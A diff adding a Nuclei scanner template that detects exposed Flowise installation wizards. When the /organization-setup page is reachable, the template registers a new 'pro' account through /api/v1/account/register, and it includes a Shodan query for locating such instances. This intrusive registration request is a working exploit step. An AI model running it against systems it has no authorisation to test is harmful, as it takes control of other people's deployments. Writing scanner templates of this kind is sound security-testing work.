@@ -1,0 +1,46 @@
+id: flowise-installer
+
+info:
+  name: Flowise Installation Wizard - Exposure
+  author: pussycat0x
+  severity: high
+  description: |
+    Flowise Installation Wizard is susceptible to the Installation page exposure due to misconfiguration
+  metadata:
+    verified: true
+    shodan-query: http.title:"Flowise - Build AI Agents, Visually"
+  tags: misconfig,exposure,install,flowise,intrusive
+
+variables:
+  name: "{{to_lower(rand_text_alpha(5))}}"
+  password: "{{rand_text_alphanumeric(12)}}"
+  email: "{{randstr}}@{{rand_base(5)}}.com"
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/organization-setup"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "Flowise - Build AI Agents, Visually")'
+          - 'status_code == 200'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /api/v1/account/register HTTP/1.1
+        Host: {{Hostname}}
+
+        {"user":{"name":"{{name}}","email":"{{email}}","type":"pro","credential":"{{password}}"}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body,"{{name}}","{{email}}","organization")'
+          - 'status_code == 201'
+        condition: and
